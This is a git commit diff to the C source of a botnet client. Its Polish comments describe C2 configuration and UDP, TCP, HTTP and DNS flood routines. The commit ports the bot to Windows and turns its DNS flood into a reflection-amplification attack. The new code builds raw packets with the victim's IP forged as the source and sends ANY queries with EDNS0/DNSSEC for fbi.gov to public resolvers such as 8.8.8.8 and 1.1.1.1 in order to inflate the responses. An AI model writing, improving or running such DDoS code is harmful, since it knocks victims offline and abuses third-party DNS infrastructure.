b3dbe925aed82b34e32f0fe9455a89b0d28ec0b1
maranty3345-spec <maranty3345@gmail.com>
2026-06-06 12:27:00 +0200

    Update DNS flood method to use IP spoofing with ANY queries

--- bot_client_vps.c
+++ bot_client_vps.c
@@ -1,13 +1,41 @@
 #include <stdio.h>
+#include <stdint.h>
 #include <stdlib.h>
 #include <string.h>
-#include <unistd.h>
-#include <pthread.h>
-#include <sys/socket.h>
-#include <arpa/inet.h>
+#include <winsock2.h>
+#include <ws2tcpip.h>
+#include <windows.h>
 #include <time.h>
-#include <fcntl.h>
-#include <netinet/tcp.h>
+#include <pthread.h> // Zakładam że masz pthreads-win32 dla Windows
+
+#pragma comment(lib, "ws2_32.lib")
+
+#define sleep(x) Sleep(1000 * (x))
+#ifndef MSG_NOSIGNAL
+#define MSG_NOSIGNAL 0
+#endif
+#define close closesocket
+
+struct iphdr {
+    unsigned int ihl:4;
+    unsigned int version:4;
+    uint8_t tos;
+    uint16_t tot_len;
+    uint16_t id;
+    uint16_t frag_off;
+    uint8_t ttl;
+    uint8_t protocol;
+    uint16_t check;
+    uint32_t saddr;
+    uint32_t daddr;
+};
+
+struct udphdr {
+    uint16_t source;
+    uint16_t dest;
+    uint16_t len;
+    uint16_t check;
+};
 
 // ==========================================
 // KONFIGURACJA BOTA C2
@@ -30,7 +58,7 @@ void set_linger(int sock) {
     struct linger sl;
     sl.l_onoff = 1;
     sl.l_linger = 0;
-    setsockopt(sock, SOL_SOCKET, SO_LINGER, &sl, sizeof(sl));
+    setsockopt(sock, SOL_SOCKET, SO_LINGER, (const char *)&sl, sizeof(sl));
 }
 
 void *udp_flood(void *arg) {
@@ -47,7 +75,7 @@ void *udp_flood(void *arg) {
         int sock = socket(AF_INET, SOCK_DGRAM, 0);
         // Optymalizacja buffora dla max predkosci
         int bufsize = 1024 * 1024;
-        setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &bufsize, sizeof(bufsize));
+        setsockopt(sock, SOL_SOCKET, SO_SNDBUF, (const char *)&bufsize, sizeof(bufsize));
         
         connect(sock, (struct sockaddr *)&target, sizeof(target));
         
@@ -77,7 +105,7 @@ void *tcp_flood(void *arg) {
         set_linger(sock); // Zapobiega TIME_WAIT
         
         int flag = 1;
-        setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, &flag, sizeof(int)); // Wylacza algorytm Nagle'a (pakiety leca instant)
+        setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, (const char *)&flag, sizeof(int)); // Wylacza algorytm Nagle'a (pakiety leca instant)
         
         // Czekamy na polaczenie (blokujace) zeby handshake sie udal
         if(connect(sock, (struct sockaddr *)&target, sizeof(target)) == 0) {
@@ -124,42 +152,92 @@ void *http_flood(void *arg) {
 
 void *dns_flood(void *arg) {
     AttackArgs *args = (AttackArgs *)arg;
-    struct sockaddr_in target;
-    target.sin_family = AF_INET;
-    target.sin_port = htons(args->port);
-    target.sin_addr.s_addr = inet_addr(args->ip);
-
-    unsigned char dns_payload[] = {
-        0x12, 0x34, // Transaction ID (bedzie losowane)
-        0x01, 0x00, // Flags: Standard query
-        0x00, 0x01, // Questions: 1
-        0x00, 0x00, // Answer RRs: 0
-        0x00, 0x00, // Authority RRs: 0
-        0x00, 0x00, // Additional RRs: 0
-        // Query: google.com
-        0x06, 'g', 'o', 'o', 'g', 'l', 'e',
-        0x03, 'c', 'o', 'm',
-        0x00,
-        0x00, 0x01, // Type: A
-        0x00, 0x01  // Class: IN
+    
+    // Przykładowa lista Open Resolvers (w prawdziwej ddosiarcze byłaby wczytywana z pliku/bazy)
+    const char *resolvers[] = {
+        "8.8.8.8", "8.8.4.4", "1.1.1.1", "1.0.0.1", "9.9.9.9", "208.67.222.222"
     };
+    int num_resolvers = sizeof(resolvers) / sizeof(resolvers[0]);
 
-    while(time(NULL) < attack_end_time && !stop_attack) {
-        int sock = socket(AF_INET, SOCK_DGRAM, 0);
-        int bufsize = 1024 * 1024;
-        setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &bufsize, sizeof(bufsize));
-        
-        connect(sock, (struct sockaddr *)&target, sizeof(target));
-        
-        for(int i = 0; i < 2000; i++) {
-            if(stop_attack) break;
-            // Losujemy Transaction ID zeby ominac chache serwerow DNS
-            dns_payload[0] = rand() % 255;
-            dns_payload[1] = rand() % 255;
-            send(sock, dns_payload, sizeof(dns_payload), MSG_NOSIGNAL);
-        }
-        close(sock);
+    // Raw socket do IP Spoofingu (wymaga roota!)
+    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
+    if (sock < 0) {
+        perror("Socket creation failed. Root privileges required for raw sockets");
+        return NULL;
     }
+
+    int one = 1;
+    const int *val = &one;
+    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, (const char *)val, sizeof(one)) < 0) {
+        perror("Error setting IP_HDRINCL");
+        close(sock);
+        return NULL;
+    }
+
+    char packet[4096];
+    struct iphdr *iph = (struct iphdr *)packet;
+    struct udphdr *udph = (struct udphdr *)(packet + sizeof(struct iphdr));
+    unsigned char *dns_payload = (unsigned char *)(packet + sizeof(struct iphdr) + sizeof(struct udphdr));
+
+    // Budowa Payloadu DNS: Zapytanie ANY dla domeny rządowej (.gov) + DNSSEC
+    // Transaction ID: 0x1234 (będzie losowane w pętli)
+    // Flags: 0x0100 (Standard query)
+    // Questions: 1, Answer RRs: 0, Authority RRs: 0, Additional RRs: 1 (dla DNSSEC/EDNS0)
+    unsigned char dns_base[] = {
+        0x12, 0x34, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01,
+        // Zapytanie o fbi.gov (przykładowa domena o wysokim współczynniku)
+        0x03, 'f', 'b', 'i', 0x03, 'g', 'o', 'v', 0x00,
+        0x00, 0xff, // Typ: ANY (255)
+        0x00, 0x01, // Klasa: IN (1)
+        // EDNS0 (OPT record) dla DNSSEC (zwiększa rozmiar odpowiedzi, DO bit set)
+        0x00, 0x00, 0x29, 0x10, 0x00, 0x00, 0x00, 0x80, 0x00, 0x00, 0x00
+    };
+    int dns_len = sizeof(dns_base);
+
+    // Nagłówek IP
+    iph->ihl = 5;
+    iph->version = 4;
+    iph->tos = 0;
+    iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + dns_len;
+    iph->id = htonl(54321); // Identyfikator pakietu
+    iph->frag_off = 0;
+    iph->ttl = 255;
+    iph->protocol = IPPROTO_UDP;
+    iph->check = 0; // Checksum wyliczany przez kernel zazwyczaj, lub zostawiony na 0 dla spoofingu zalezy od sys
+    iph->saddr = inet_addr(args->ip); // SPOOFING: Adres źródłowy to adres OFIARY!
+    // Docelowy adres ustawiany w pętli (Resolver)
+
+    // Nagłówek UDP
+    udph->source = htons(args->port > 0 ? args->port : (rand() % 60000 + 1024)); // Port źródłowy ofiary (lub losowy)
+    udph->dest = htons(53); // Port docelowy DNS (53)
+    udph->len = htons(sizeof(struct udphdr) + dns_len);
+    udph->check = 0; // Opcjonalne w UDP
+
+    struct sockaddr_in dest_addr;
+    dest_addr.sin_family = AF_INET;
+
+    while (time(NULL) < attack_end_time && !stop_attack) {
+        // Asynchroniczna pętla wypuszczająca śmieci, rotacja resolverów
+        for (int i = 0; i < 5000; i++) {
+            if (stop_attack) break;
+            
+            // Rotacja serwera docelowego (Resolvera)
+            const char *resolver_ip = resolvers[rand() % num_resolvers];
+            iph->daddr = inet_addr(resolver_ip);
+            dest_addr.sin_addr.s_addr = iph->daddr;
+
+            // Losowanie Transaction ID
+            dns_base[0] = rand() % 255;
+            dns_base[1] = rand() % 255;
+            
+            // Kopiowanie aktualnego payloadu DNS do pakietu
+            memcpy(dns_payload, dns_base, dns_len);
+
+            // Wysyłanie sfałszowanego pakietu
+            sendto(sock, packet, iph->tot_len, MSG_NOSIGNAL, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
+        }
+    }
+    close(sock);
     return NULL;
 }
 
